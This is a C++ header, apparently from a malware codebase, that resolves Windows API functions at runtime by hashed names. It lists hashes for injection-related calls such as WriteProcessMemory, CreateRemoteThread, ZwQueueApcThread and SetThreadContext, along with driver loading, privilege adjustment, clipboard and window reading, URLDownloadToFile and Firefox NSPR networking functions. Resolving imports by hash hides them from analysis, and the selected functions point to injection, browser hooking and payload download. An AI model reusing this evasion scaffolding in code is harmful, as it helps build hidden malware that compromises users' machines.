#include <windows.h>
void *m_memset( void *szBuffer, DWORD dwSym, DWORD dwLen );
void *m_memcpy( void *szBuf, const void *szStr, int nLen );
LPVOID GetApiAddr( HMODULE hModule, DWORD dwProcNameHash );
//HMODULE GetDllBase( DWORD dwDllHash );

#define RVATOVA( base, offset ) ( (DWORD)base + (DWORD)offset )

LPVOID GetProcAddressEx( char *Dll, DWORD dwModule, DWORD dwProcNameHash);
//DWORD pGetLastError();


template <DWORD h, DWORD hash>
inline LPVOID pushargEx()
{	
	typedef LPVOID (WINAPI *newfunc)();
	newfunc func = (newfunc)GetProcAddressEx( NULL, h, hash );
	return func();
}

template <DWORD h, DWORD hash, class A>
inline LPVOID pushargEx(A a1)
{	
	typedef LPVOID (WINAPI *newfunc)(A);
	newfunc func = (newfunc)GetProcAddressEx( NULL, h, hash );
	return func(a1);
}

template <DWORD h, DWORD hash, class A, class B>
inline LPVOID pushargEx(A a1,  B a2)
{	
	typedef LPVOID (WINAPI *newfunc)(A, B);
	newfunc func = (newfunc)GetProcAddressEx( NULL, h, hash );
	return func(a1,a2);
}

template <DWORD h, DWORD hash, class A, class B, class C>
inline LPVOID pushargEx(A a1,  B a2, C a3)
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C);
	newfunc func = (newfunc)GetProcAddressEx( NULL, h, hash );
	return func(a1,a2,a3);
}

template <DWORD h, DWORD hash, class A, class B, class C, class D>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4)
{	
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D);
	newfunc func = (newfunc)GetProcAddressEx( NULL, h, hash );
	return func(a1,a2,a3,a4);
}

template <DWORD h, DWORD hash, class A, class B, class C, class D, class E>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5)
{	
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E);
	newfunc func = (newfunc)GetProcAddressEx( NULL, h, hash );
	return func(a1, a2, a3, a4, a5);
}

template <DWORD h, DWORD hash, class A, class B, class C, class D, class E, class F>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6)
{	
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F);
	newfunc func = (newfunc)GetProcAddressEx( NULL, h, hash );
	return func(a1, a2, a3, a4, a5, a6);
}

template <DWORD h, DWORD hash, class A, class B, class C, class D, class E, class F, class G>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7)
{	
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G);
	newfunc func = (newfunc)GetProcAddressEx( NULL, h, hash );
	return func(a1, a2, a3, a4, a5, a6, a7);
}

template <DWORD h, DWORD hash, class A, class B, class C, class D, class E, class F, class G, class H>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8)
{	
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H);
	newfunc func = (newfunc)GetProcAddressEx( NULL, h, hash );
	return func(a1, a2, a3, a4, a5, a6, a7, a8);
}

template <DWORD h, DWORD hash, class A, class B, class C, class D, class E, class F, class G, class H, class I>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8, I a9)
{	
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H, I);
	newfunc func = (newfunc)GetProcAddressEx( NULL, h, hash );
	return func(a1, a2, a3, a4, a5, a6, a7, a8, a9);
}

template <DWORD h, DWORD hash, class A, class B, class C, class D, class E, class F, class G, class H, class I, class X>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8, I a9, X a10)
{	
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H, I, X);
	newfunc func = (newfunc)GetProcAddressEx( NULL, h, hash );
	return func(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10);
}

template <DWORD h, DWORD hash, class A, class B, class C, class D, class E, class F, class G, class H, class I, class X, class Y>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8, I a9, X a10, Y a11 )
{	
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H, I, X, Y);
	newfunc func = (newfunc)GetProcAddressEx( NULL, h, hash );
	return func(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11);
}

template <DWORD h, DWORD hash, class A, class B, class C, class D, class E, class F, class G, class H, class I, class X, class Y, class Z, class R>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8, I a9, X a10, Y a11, Z a12, R a13)
{	
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H, I, X, Y, Z, R);
	newfunc func = (newfunc)GetProcAddressEx( NULL, h, hash );
	return func(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13);
}


//kernel32
#define pLoadLibraryA 				pushargEx<1,0xC8AC8026>
#define pLoadLibraryW 				pushargEx<1,0xC8AC8030>
#define pLoadLibraryExA 			pushargEx<1,0x20088E6A>
#define pLoadLibraryExW 			pushargEx<1,0x20088E7C>
#define pFreeLibrary 				pushargEx<1,0x4B935B8E>
#define pGetProcAddress 			pushargEx<1,0x1FC0EAEE>
#define pTerminateProcess			pushargEx<1,0x9E6FA842>
#define pVirtualAlloc 				pushargEx<1,0x697A6AFE>
#define pVirtualAllocEx 			pushargEx<1,0x9ABFB8A6>
#define pVirtualFree 				pushargEx<1,0x3A35705F>
#define pVirtualFreeEx 				pushargEx<1,0x5C17EC75>
#define pVirtualQuery 				pushargEx<1,0x6A582465>
#define pVirtualQueryEx 			pushargEx<1,0x919786E>
#define pVirtualProtect 			pushargEx<1,0xA9DE6F5A>
#define pVirtualProtectEx 			pushargEx<1,0x9BD6888F>
#define pCloseHandle 				pushargEx<1,0x723EB0D5>
#define pGlobalAlloc 				pushargEx<1,0x725EA171>
#define pGlobalFree 				pushargEx<1,0x240339C8>
#define pCreateFileA 				pushargEx<1,0x8F8F114>
#define pCreateFileW 				pushargEx<1,0x8F8F102>
#define pWriteFile 					pushargEx<1,0xF3FD1C3>
#define pGetCurrentDirectoryA		pushargEx<1,0xC80715CE>
#define pWriteProcessMemory 		pushargEx<1,0xBEA0BF35>
#define pCreateRemoteThread 		pushargEx<1,0xE61874B3>
#define pReadFile 					pushargEx<1,0x487FE16B>
#define pSetFilePointer 			pushargEx<1,0xEF48E03A>
#define pCopyFileA 					pushargEx<1,0x2EE4F10D>
#define pCopyFileW 					pushargEx<1,0x2EE4F11B>
#define pMoveFileA 					pushargEx<1,0x20E4E9ED>
#define pMoveFileW 					pushargEx<1,0x20E4E9FB>
#define pMoveFileExA 				pushargEx<1,0x3A7A7478>
#define pMoveFileExW 				pushargEx<1,0x3A7A746E>
#define pDeleteFileA 				pushargEx<1,0x81F0F0DF>
#define pDeleteFileW 				pushargEx<1,0x81F0F0C9>
#define pGetFileSize 				pushargEx<1,0xAEF7CBF1>
#define pCreateFileMappingA 		pushargEx<1,0xEF0A25B7>
#define pCreateFileMappingW 		pushargEx<1,0xEF0A25A1>
#define pMapViewOfFile 				pushargEx<1,0x5CD9430>
#define pGetFileTime 				pushargEx<1,0xAE17C071>
#define pSetFileTime 				pushargEx<1,0xAE17C571>
#define pGetModuleHandleA 			pushargEx<1,0xA48D6762>
#define pGetModuleHandleW 			pushargEx<1,0xA48D6774>
#define pUnmapViewOfFile 			pushargEx<1,0x77CD9567>
#define pWaitForSingleObject 		pushargEx<1,0xC54374F3>
#define pSleep 						pushargEx<1,0x3D9972F5>
#define pWideCharToMultiByte 		pushargEx<1,0xE74F57EE>
#define pMultiByteToWideChar 		pushargEx<1,0x5AA7E70B>
#define pGetModuleFileNameA 		pushargEx<1,0x774393E8>
#define pGetModuleFileNameW 		pushargEx<1,0x774393FE>
#define pGetSystemDirectoryA 		pushargEx<1,0x49A1374A>
#define pGetSystemDirectoryW 		pushargEx<1,0x49A1375C>
#define pGetTempPathA 				pushargEx<1,0x58FE7ABE>
#define pGetTempPathW 				pushargEx<1,0x58FE7AA8>
#define pGetVolumeInformationA 		pushargEx<1,0x67ECDE97>
#define pGetVolumeInformationW 		pushargEx<1,0x67ECDE81>
#define pSetFileAttributesA 		pushargEx<1,0x4D5587B7>
#define pSetFileAttributesW 		pushargEx<1,0x4D5587A1>
#define pCreateProcessA 			pushargEx<1,0x46318AC7>
#define pCreateProcessW 			pushargEx<1,0x46318AD1>
#define pGetVersionExA 				pushargEx<1,0x9C480E24>
#define pGetVersionExW 				pushargEx<1,0x9C480E32>
#define pCreateThread 				pushargEx<1,0x6FB89AF0>
#define pCreateMutexA 				pushargEx<1,0xBF78969C>
#define pCreateMutexW 				pushargEx<1,0xBF78968A>
#define pReleaseMutex 				pushargEx<1,0xBB74A4A2>
#define pGetVersion 				pushargEx<1,0xCB932CE2>
#define pDeviceIoControl 			pushargEx<1,0x82E8173>
#define pQueryDosDeviceA 			pushargEx<1,0xAC81BECB>
#define pQueryDosDeviceW 			pushargEx<1,0xAC81BEDD>
#define pIsBadReadPtr 				pushargEx<1,0x7D544DBD>
#define pIsBadWritePtr 				pushargEx<1,0xAC85818D>
#define pGetCurrentProcess 			pushargEx<1,0xD89AD05>
#define pCreateMutexA 				pushargEx<1,0xBF78969C>
#define pCreateMutexW 				pushargEx<1,0xBF78968A>
#define pReleaseMutex 				pushargEx<1,0xBB74A4A2>
#define pCreateEventW 				pushargEx<1,0x8D5A50CA>
#define pSetEvent 					pushargEx<1,0x5E7EE0D0>
#define pResetEvent 				pushargEx<1,0x3B3EE0F9>
#define pGetShortPathNameA 			pushargEx<1,0x223296ED>
#define pGetShortPathNameW 			pushargEx<1,0x223296FB>
#define pLocalFree 					pushargEx<1,0x84033DEB>
#define pGetPrivateProfileStringA 	pushargEx<1,0xAA19E291>
#define pGetPrivateProfileStringW 	pushargEx<1,0xAA19E287>
#define pGetFileAttributesA 		pushargEx<1,0x475587B7>
#define pGetFileAttributesW 		pushargEx<1,0x475587A1>
#define pGetEnvironmentVariableA 	pushargEx<1,0x9802EF30>
#define pGetEnvironmentVariableW 	pushargEx<1,0x9802EF26>
#define pReadProcessMemory 			pushargEx<1,0x9D00A761>
#define pExitProcess 				pushargEx<1,0x95902B19>
#define pOpenProcess 				pushargEx<1,0x99A4299D>
#define pGetCurrentProcessId		pushargEx<1,0x6B416786>
#define pProcess32First 			pushargEx<1,0x19F78C90>
#define pProcess32Next 				pushargEx<1,0xC930EA1E>
#define pCreateToolhelp32Snapshot	pushargEx<1,0x5BC1D14F>
#define pWinExec 					pushargEx<1,0xE8BF6DAD>
#define pFindResourceA 				pushargEx<1,0x8FE060C>
#define pSetLastError 				pushargEx<1,0x1295012C>
#define pLoadResource 				pushargEx<1,0x1A10BD8B>
#define pLockResource 				pushargEx<1,0x1510BD8A>
#define pSizeofResource 			pushargEx<1,0x86867F0E>
#define pLockRsrc 					pushargEx<1,0xBAC5467D>
#define pGetTempFileNameA 			pushargEx<1,0xFA4F502>
#define pGetTempFileNameW 			pushargEx<1,0xFA4F514>
#define pGetLongPathNameA 			pushargEx<1,0x9835D5A1>
#define pCreateEventA				pushargEx<1,0x8D5A50DC>
#define pConnectNamedPipe			pushargEx<1,0x7235F00E>
#define pCreateNamedPipeA			pushargEx<1,0x42F9BB48>
#define pGetTickCount				pushargEx<1,0x69260152>
#define pExitThread					pushargEx<1,0x768AA260>
#define plstrcmpiA					pushargEx<1,0x515BE757>
#define pSuspendThread				pushargEx<1,0xEEBA5EBA>
#define pGetComputerNameA			pushargEx<1,0x3DEF91BA>
#define pGetThreadContext			pushargEx<1,0xAA1DE02F>
#define pSetThreadContext			pushargEx<1,0xAA1DC82F>
#define pResumeThread				pushargEx<1,0x7B88BF3B>
#define pProcessIdToSessionId		pushargEx<1,0x654F3F9E>
#define	pWTSGetActiveConsoleSessionId	pushargEx<1,0x654FEEAC>
#define pOpenMutexA					pushargEx<1,0xAE52C609>
#define pCreateProcessInternalA		pushargEx<1,0xE24394E4>
#define pCreateProcessInternalW		pushargEx<1,0xE24394F2>
#define pTerminateThread			pushargEx<1,0xC09D5D66>
#define plopen						pushargEx<1,0xCDFC3010>
#define plstrcmpA					pushargEx<1,0x2CA2B7E6>
#define plstrcmpW					pushargEx<1,0x2CA2B7F0>
#define plstrcatA					pushargEx<1,0x2CA1B5E6>
#define plstrcatW					pushargEx<1,0x2CA1B5F0>
#define plstrcpyA					pushargEx<1,0x2CA5F366>
#define plstrcpyW					pushargEx<1,0x2CA5F370>
#define plstrlenA					pushargEx<1,0x2D40B8E6>
#define plstrlenW					pushargEx<1,0x2D40B8F0>
#define pThread32First				pushargEx<1,0x89B968D2>
#define pThread32Next				pushargEx<1,0x4C1077D6>
#define pOpenThread					pushargEx<1,0x7E92CA65>
#define pGetWindowsDirectoryA		pushargEx<1,0x78B00C7E>
#define pGetWindowsDirectoryW		pushargEx<1,0x78B00C68>
#define pFindFirstFileA				pushargEx<1,0x32432444>
#define pFindNextFileA				pushargEx<1,0x279DEAD7>
#define pFindClose  				pushargEx<1,0x7B4842C1>


//advapi32
#define pCreateProcessAsUserA		pushargEx<2,0x985267C4>
#define pSetThreadToken				pushargEx<2,0xA16FE0FD>
#define pOpenProcessToken 			pushargEx<2,0x80DBBE07>
#define pLookupPrivilegeValueA 		pushargEx<2,0x1B3D12B9>
#define pLookupPrivilegeValueW 		pushargEx<2,0x1B3D12AF>
#define pAdjustTokenPrivileges 		pushargEx<2,0x7A2167DC>
#define pRegOpenKeyExA 				pushargEx<2,0xAAD67FF8>
#define pRegOpenKeyExW 				pushargEx<2,0xAAD67FEE>
#define pRegQueryInfoKeyA 			pushargEx<2,0xBDF4DB19>
#define pRegQueryInfoKeyW 			pushargEx<2,0xBDF4DB0F>
#define pRegEnumKeyExA 				pushargEx<2,0xB4F673FD>
#define pRegEnumKeyExW 				pushargEx<2,0xB4F673EB>
#define pRegEnumValueA 				pushargEx<2,0xF65A7D95>
#define pRegEnumValueW 				pushargEx<2,0xF65A7D83>
#define pRegQueryValueExA 			pushargEx<2,0x1802E7C8>
#define pRegQueryValueExW 			pushargEx<2,0x1802E7DE>
#define pRegCloseKey 				pushargEx<2,0xDB355534>
#define pRegDeleteKeyA 				pushargEx<2,0x398C5285>
#define pRegDeleteKeyW 				pushargEx<2,0x398C5293>
#define pRegSetValueExA 			pushargEx<2,0x3E400FD6>
#define pRegSetValueExW 			pushargEx<2,0x3E400FC0>
#define pGetUserNameA 				pushargEx<2,0xB9D41C2F>
#define pGetUserNameW 				pushargEx<2,0xB9D41C39>
#define pOpenServiceA 				pushargEx<2,0x83969964>
#define pStartServiceA 				pushargEx<2,0x1CA1FD2F>
#define pGetKernelObjectSecurity 	pushargEx<2,0xB29136DD>
#define pOpenSCManagerA 			pushargEx<2,0xA06E459C>
#define pGetCurrentHwProfileA		pushargEx<2,0xF684C7A9>
#define pGetTokenInformation		pushargEx<2,0xD4ECC759>
#define pInitializeSecurityDescriptor	pushargEx<2,0xB8538A52>
#define pSetSecurityDescriptorOwner pushargEx<2,0xDADD5994>
#define pSetFileSecurityW			pushargEx<2,0x5A9B2FDD>


//user32
#define pExitWindowsEx 				pushargEx<3,0xAD7043A4>
#define pPeekMessageW 				pushargEx<3,0xD7A87C3A>
#define pDispatchMessageW 			pushargEx<3,0x4BAED1DE>
#define pMsgWaitForMultipleObjects 	pushargEx<3,0xD36CEAF0>
#define pWaitForInputIdle			pushargEx<3,0x4FAC81B4>
#define pGetWindowThreadProcessId	pushargEx<3,0x6C7F716F>
#define pFindWindowA				pushargEx<3,0x252B53B>
#define pGetSystemMetrics			pushargEx<3,0x8EBEF5B1>
#define pGetActiveWindow			pushargEx<3,0xDB7C98AC>
#define pGetKeyboardLayoutNameA		pushargEx<3,0xEA0FAD78>
#define pOpenClipboard				pushargEx<3,0x6ADFC795>
#define pGetClipboardData			pushargEx<3,0x8E7AE818>
#define pCloseClipboard				pushargEx<3,0xF0EC2212>
#define pGetWindowTextA				pushargEx<3,0x9C29100A>
#define pGetForegroundWindow		pushargEx<3,0xCACD450>
#define pGetWindowLongPtrA			pushargEx<3,0x1D6C998B>
#define pGetWindowLongPtrW			pushargEx<3,0x1D6C999D>
#define pEnumChildWindows			pushargEx<3,0xAE8A5532>
#define pGetParent					pushargEx<3,0x5992A5F2>
#define pGetDesktopWindow			pushargEx<3,0xCD4AC62B>
#define pIsWindowVisible			pushargEx<3,0xCFAAD7BF>
#define pSetWindowLongA				pushargEx<3,0xBD6C998B>
#define pGetWindowLongA				pushargEx<3,0x1D6C998B>
#define pSetLayeredWindowAttributes	pushargEx<3,0x2DDBD2AF>
#define pSetWindowPos				pushargEx<3,0xA92DF5AF>

//winsock
#define pWSACleanup 				pushargEx<4,0x8FB8B5BD>
#define pWSAStartup 				pushargEx<4,0xCDDE757D>
#define psocket 					pushargEx<4,0xFC7AF16A>
#define pclosesocket 				pushargEx<4,0x939D7D9C>
#define paccept 					pushargEx<4,0x3C797B7A>
#define pbind 						pushargEx<4,0xC5A7764>
#define phtons 						pushargEx<4,0x8E9BF775>
#define plisten 					pushargEx<4,0x9E7D3188>
#define precv 						pushargEx<4,0xE5971F6>
#define psend 						pushargEx<4,0xE797764>
#define pconnect 					pushargEx<4,0xEDD8FE8A>
#define pshutdown 					pushargEx<4,0x4C7C5841>
#define pgethostbyname 				pushargEx<4,0xF44318C6>
#define pgethostbyaddr 				pushargEx<4,0xF5A25C51>
#define pinet_addr 					pushargEx<4,0x95E4A5D7>
#define pinet_ntoa 					pushargEx<4,0x9400A044>
#define pgetaddrinfo				pushargEx<4,0xD9F839BA>
#define pgetpeername				pushargEx<4,0xD939F838>
#define pselect						pushargEx<4,0x5D99726A>
#define psetsockopt					pushargEx<4,0xD8923733>
#define pWSAGetLastError			pushargEx<4,0x8E878072>
#define pWSASetLastError			pushargEx<4,0x8E850072>

//ntdll
#define pRtlInitUnicodeString 		pushargEx<5,0x3287EC73>
#define pRtlInitAnsiString			pushargEx<5,0xEE02056A>
#define pNtOpenFile 				pushargEx<5,0x9C45B56C>
#define pNtOpenDirectoryObject 		pushargEx<5,0xF5F11CF0>
#define pNtCreateSection 			pushargEx<5,0x6E6F608B>
#define pNtOpenSection 				pushargEx<5,0x5FA9AB38>
#define pZwLoadDriver 				pushargEx<5,0x42F57D33>
#define pZwUnloadDriver 			pushargEx<5,0x95849B61>
#define pRtlAdjustPrivilege 		pushargEx<5,0xC2A6B1AE>
#define pZwMakeTemporaryObject 		pushargEx<5,0x128CE9D3>
#define pNtClose 					pushargEx<5,0x3D9AC241>
#define pRtlImageNtHeader			pushargEx<5,0xDD39FD14>
#define pZwQuerySystemInformation	pushargEx<5,0xBC44A131>
#define pZwUnmapViewOfSection		pushargEx<5,0x9ED4D161>
#define pZwMapViewOfSection			pushargEx<5,0x594D9A3C>
#define pZwQueueApcThread			pushargEx<5,0xC0E4F6EE>
#define pZwResumeThread				pushargEx<5,0xACF8BF39>
#define pZwTestAlert				pushargEx<5,0xC952A06B>
#define pZwQueryInformationThread	pushargEx<5,0xFAEDF3AA>
#define pZwOpenProcess				pushargEx<5,0x9C0AC99D>
#define pZwOpenProcessToken			pushargEx<5,0xADACBE07>
#define pZwClose					pushargEx<5,0x3D9A9259>
#define pZwAllocateVirtualMemory	pushargEx<5,0x594AA9E4>
#define pZwFreeVirtualMemory		pushargEx<5,0xBED3922C>
#define pZwWriteVirtualMemory		pushargEx<5,0xEEE7AF23>
#define pZwProtectVirtualMemory		pushargEx<5,0x3836C63E>
#define pRtlCreateUserThread		pushargEx<5,0xE9E0A4F7>
#define pLdrLoadDll					pushargEx<5,0x78740534>
#define pLdrGetDllHandle			pushargEx<5,0x7E287C6A>
#define pLdrGetProcedureAddress		pushargEx<5,0x323C2875>
#define pZwSetContextThread			pushargEx<5,0x62E2FE6F>
#define pZwSetInformationProcess	pushargEx<5,0xCA2BF652>

//winsta
#define pWinStationTerminateProcess	pushargEx<6,0xA60C5F05>

//shell32
#define pSHGetSpecialFolderPathA 	pushargEx<7,0xC95D8550>
#define pSHGetSpecialFolderPathW 	pushargEx<7,0xC95D8546>
#define pFindExecutableA			pushargEx<7,0x37707500>



//wininet
#define pInternetConnectA 			pushargEx<8,0xBE618D3E>
#define pInternetConnectW 			pushargEx<8,0xBE618D28>
#define pHttpOpenRequestA 			pushargEx<8,0x1510002F>
#define pHttpOpenRequestW 			pushargEx<8,0x15100039>
#define pHttpSendRequestA 			pushargEx<8,0x9F13856A>
#define pHttpSendRequestW 			pushargEx<8,0x9F13857C>
#define pInternetCloseHandle 		pushargEx<8,0x7314FB0C>
#define pInternetQueryOptionA 		pushargEx<8,0x2AE71934>
#define pInternetQueryOptionW 		pushargEx<8,0x2AE71922>
#define pInternetSetOptionA 		pushargEx<8,0x1AD09C78>
#define pInternetSetStatusCallback 	pushargEx<8,0x9EF6461>
#define pHttpQueryInfoA 			pushargEx<8,0x2F5CE027>
#define pHttpQueryInfoW 			pushargEx<8,0x2F5CE031>
#define pHttpAddRequestHeadersA		pushargEx<8,0xB5901061>
#define pHttpAddRequestHeadersW		pushargEx<8,0xB5901077>
#define pGetUrlCacheEntryInfoW 		pushargEx<8,0x57FBC0CB>
#define pFindFirstUrlCacheEntryA	pushargEx<8,0xDDCB15D>
#define pFindNextUrlCacheEntryA		pushargEx<8,0x8733D614>
#define pDeleteUrlCacheEntry		pushargEx<8,0xA3A80AB6>
#define pFindCloseUrlCache			pushargEx<8,0xFDE87743>
#define pInternetOpenA				pushargEx<8,0x8593DD7>
#define pInternetOpenUrlA			pushargEx<8,0xB87DBD66>
#define pInternetReadFile			pushargEx<8,0x1A212962>
#define pInternetReadFileExA		pushargEx<8,0x2C523864>
#define pInternetReadFileExW		pushargEx<8,0x2C523872>


//urlmon
#define pURLDownloadToFileA			pushargEx<9,0xD95D2399>
#define pURLDownloadToFileW			pushargEx<9,0xD95D238F>
#define pObtainUserAgentString		pushargEx<9,0x534D481>

//nspr4
#define pPR_GetError				pushargEx<10,0x1D3347F>
#define pPR_MillisecondsToInterval	pushargEx<10,0x5BF9111>
#define pPR_Poll					pushargEx<10,0xFA1AB4F9>
#define pPR_SetError				pushargEx<10,0x1FB347F>
#define pPR_GetOSError				pushargEx<10,0xBEBFDE8D>
#define pPR_ErrorToName				pushargEx<10,0xE2C4D38>
#define pPR_Available				pushargEx<10,0xDDF2584>
#define pPR_GetConnectStatus		pushargEx<10,0xA4989C58>









